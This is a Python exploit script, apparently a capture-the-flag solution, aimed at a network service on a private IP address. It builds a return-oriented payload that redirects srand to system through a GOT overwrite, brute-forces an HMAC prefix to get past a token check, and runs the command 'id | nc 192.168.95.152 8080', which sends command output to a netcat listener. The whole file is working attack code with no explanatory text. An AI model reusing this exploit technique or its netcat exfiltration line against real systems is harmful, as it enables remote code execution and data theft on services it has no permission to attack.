from err0rless import connst
from struct import pack
import hmac, hashlib

s, t = connst("192.168.95.152", 20003)

# HMAC with hashlib.sha1
def HMAC(key, data):
    h = hmac.new(key, data, hashlib.sha1)
    h = h.hexdigest()

    return h

def create_json(title, contents):
    j  = '{ "tags":["tags1", "tags2"], '
    j += '"title":"'    + title    + '", '
    j += '"contents":"' + contents + '", '
    j += '"serverip":"127.0.0.1", '
    j += '"bypassHMAC":"" }'

    return j

def hashCollision(Token, j):
    i = 0
    while True:
        j = j[ : j.find('HMAC":"') + 7 ] + str(i) + '"}'
        hash = HMAC(Token, Token + "\n" + j)
        if hash[:4] == "0000": break
        i = i + 1

    return j

def memcpy(dest, src, n):
    p  = pack("I", 0x08048E60) # memcpy@plt
    p += pack("I", 0x0804964d) # p-p-p-ret
    p += pack("I", dest)       
    p += pack("I", src)
    p += "\\\u0" + str(n) + "00\\\u0000"

    return p

def pMain():
    Token = s.recv(1024)[1:-2]

    p  = "A" * 127
    p += "\\\\u4242" + "C" * 27
    p += pack("I", 0x0804BE08)  # fake ebp ; &.bss

    # overwrite srand -> system@libc
    p += pack("I", 0x08049a4f)  # pop ebx ; ret
    p += pack("I", 0x0804BCD4 - 0x5d5b04c4 & 0xffffffff)
    p += pack("I", 0x08049b4f)  # pop eax ; add esp, 0x5c ; ret
    p += "\\\u609b\\\u0000"     # system@libc - srand@libc : 0x9b60
    p += "A" * 0x5C
    p += pack("I", 0x080493fe)  # add [ebx + 0x5d5b04c4], eax; ret
    
    bss = 0x0804BE0C
    p += memcpy(bss + 0, 0x0804BCD4, 4) # system@libc
    p += memcpy(bss + 8, 0x0804BDF4, 4) # gContents
    
    p += pack("I", 0x08049431)  # leave ; ret

    j = create_json(p, "id | nc 192.168.95.152 8080") # set command
    j = hashCollision(Token, j)

    s.send(Token + "\n" + j)

if __name__ == "__main__":
    pMain()